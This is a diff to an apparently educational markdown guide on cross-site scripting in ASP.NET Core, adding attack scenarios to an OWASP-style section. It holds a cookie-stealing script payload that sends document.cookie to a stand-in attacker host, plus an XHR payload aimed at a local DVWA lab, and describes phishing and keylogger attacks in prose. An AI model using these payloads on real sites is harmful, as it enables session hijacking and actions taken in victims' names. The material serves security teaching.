@@ -54,6 +54,7 @@ Detection of most Server XSS flaws is fairly easy via testing or code analysis. 
 Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.
 
 ### Xss Attack sample
+* Hijack a user’s session
 The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
 
 ```(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";```
@@ -62,8 +63,35 @@ The attacker modifies the 'CC' parameter in their browser to:
 
 ```'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.```
 
+* **asp.net core** protect it cookie from this kind of vulnerability, to enable cookie for document.cookie you need set ``` options.Cookie.HttpOnly=false```
+```
+    services.ConfigureApplicationCookie(options =>
+    {
+        options.Cookie.HttpOnly = true;
+    });
+```
+
 This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
 Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.
+
+* Perform unauthorized activities
+If the HTTPOnly cookie attribute is set, we cannot steal the cookies through JavaScript. However, using the XSS attack, we can still perform unauthorized actions inside the application on behalf of the user.
+```
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
+	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
+</script>
+```
+
+* Phishing to steal user credentials
+XSS can also be used to inject a form into the vulnerable page and use this form to collect user credentials. This type of attack is called phishing.
+
+* Capture the key strokes by injecting a keylogger
+In this attack scenario we will inject a JavaScript keylogger into the vulnerable web page and we will capture all the key strokes of the user within the current page.
+
+First of all, we will create a separate JavaScript file and we will host it on the attacker controlled server. We need this file because the payload is too big to be inserted in the URL and we avoid encoding and escaping errors
 
 ## Resources
 * [OWASP .NET](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DotNet_Security_Cheat_Sheet.md)
@@ -71,4 +99,6 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 * [OWASP Top Ten 2017](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)
 * [Cross Site Scripting (XSS)](https://blog.sucuri.net/2019/01/owasp-top-10-security-risks-part-iv.html)
 * [Cross Site Scripting (XSS) Asp net core](https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-2.2)
+* [xss-attacks-practical-scenarios](https://pentest-tools.com/blog/xss-attacks-practical-scenarios/)
+* [HTTP only, Secure cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
 
